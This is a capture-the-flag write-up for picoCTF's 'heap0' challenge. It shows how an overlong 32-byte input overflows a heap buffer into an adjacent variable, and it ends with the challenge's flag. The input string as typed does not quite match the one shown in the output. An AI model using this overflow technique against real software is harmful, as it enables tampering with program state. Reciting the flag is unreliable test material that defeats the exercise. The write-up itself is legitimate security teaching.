# Given

Are overflows just a stack concern?
Download the binary [here](https://artifacts.picoctf.net/c_tethys/13/chall).
Download the source [here](https://artifacts.picoctf.net/c_tethys/13/chall.c).
Additional details will be available after launching your challenge instance.

# Solution
When you netcat into the instance, it immediately gives these instructions:
```
Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x6500f57582b0  ->   pico
+-------------+----------------+
[*]   0x6500f57582d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit
```
Trying the options one at a time, we see the following:
- Option 1 just prints out the same heap state from above. Notice that the addresses of the 2 variables are right next to each other,
  separated by 32 bytes.
- Skipping to option 3, it looks like safe_var is the second address from the heap data
- Option 4 prints the following:
```
Looks like everything is still secure!

No flage for you :(
```
So, based on the first line of this response, and "I'm confident it \[safe_var\] can't be modified",
my best guess would be that we just have to change the value of safe_var somehow.
Let's test a little bit of input, to make sure we don't mess up the flag.
Writing in `01234567` with option 2 gives us the following heap dump:
```
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x64085cf412b0  ->   01234567
+-------------+----------------+
[*]   0x64085cf412d0  ->   bico
+-------------+----------------+
```
So, it looks like we're writing over the first variable.
To get safe_var to change, we might just have to make our input 32 characters long.
Try option 2 again with the input:
`012345678901234567890123445678901`
and we get the heap dump:
```
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x64085cf412b0  ->   01234567890123456789012345678901
+-------------+----------------+
[*]   0x64085cf412d0  ->   
+-------------+----------------+
```
Nice. Looks like we perfectly filled up the 32 bytes, and then got a null byte placed at the end of our string 
(which just so happens to be the starting address of the next string), making
`safe_var` look like just an empty string. Checking option 4 now, we get:
```
YOU WIN
picoCTF{my_first_heap_overflow_4fa6dd49}
```
